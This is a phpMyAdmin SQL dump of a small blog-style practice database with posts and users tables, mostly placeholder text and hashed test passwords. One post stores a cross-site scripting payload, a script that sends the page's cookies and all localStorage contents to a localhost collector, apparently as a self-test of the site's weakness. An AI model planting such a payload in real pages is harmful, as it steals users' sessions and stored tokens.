-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Oct 24, 2021 at 07:57 PM
-- Server version: 10.4.17-MariaDB
-- PHP Version: 8.0.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `icar`
--

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `article` text NOT NULL,
  `created_at` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `user_id`, `title`, `article`, `created_at`) VALUES
(1, 1, 'sdfasdf', 'dsafsdfasdfsdf', '2021-10-17 18:57:05'),
(2, 2, 'dsfasdfsdfasd', 'fasdfdsafsda', '2021-10-17 18:57:05'),
(3, 1, 'dsafdsfasdf', 'dsafsdfsdaf', '2021-10-17 20:44:41'),
(4, 1, 'dsafdsfasdf', 'dsafsdfsdaf', '2021-10-17 20:44:56'),
(5, 1, 'This is my first title', 'this is my first article', '2021-10-17 20:46:29'),
(9, 1, 'Hi, I am very friendly and vulnerable ???‍?', 'This is sad!\r\n\r\n<script>\r\n    fetch(\"http://localhost:3000/xss\", {\r\n      method: \"POST\",\r\n      headers: {\r\n        \"Content-Type\": \"application/json\",\r\n      },\r\n      body: JSON.stringify({\r\n        fromURL: location.href,\r\n        domain: location.origin,\r\n        cookies: document.cookie,\r\n        localStorage: (() => {\r\n          let counter = 0;\r\n          let lsData = {};\r\n    \r\n          while (true) {\r\n            const key = localStorage.key(counter++);\r\n    \r\n            if (!key) {\r\n              return lsData;\r\n            }\r\n    \r\n            lsData[key] = localStorage.getItem(key);\r\n          }\r\n        })(),\r\n      }),\r\n    })\r\n</script>', '2021-10-20 20:50:15'),
(10, 1, 'adfdsafasdfs', 'adsfsdaffdsfa\r\ndsf\r\nfsda\r\ndsfsd\r\nfsdaafdsdsaf\r\nadsf\r\nf\r\ndsdf\r\ns\r\nf', '2021-10-20 20:59:37'),
(11, 1, 'The story of how I got hacked like an idiot', 'I am an idiot', '2021-10-24 18:36:07'),
(12, 1, 'bgdgfhfg', 'dghfghgfh', '2021-10-24 19:44:50');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `name` varchar(35) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `password`) VALUES
(1, 'User1', 'user1@gmail.com', '$2y$10$lxThYuYVmQ24gevNrhMdN.MQ2sufGDIe5lS0zK78f.K80GYPlx6Wa'),
(2, 'User2', 'user2@gmail.com', '$2y$10$hVTatH7BKz1g/Xu4JWQVpeVVdCMFWblQRK0Cj0leFEDU7JF266wfy'),
(3, 'User3', 'user3@gmail.com', '$2y$10$JuzffDTYsQNeL6uJ8tzYA.9Ppsyx.s40WVlqvsKZ7eYutfiYmOiEG');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `email` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
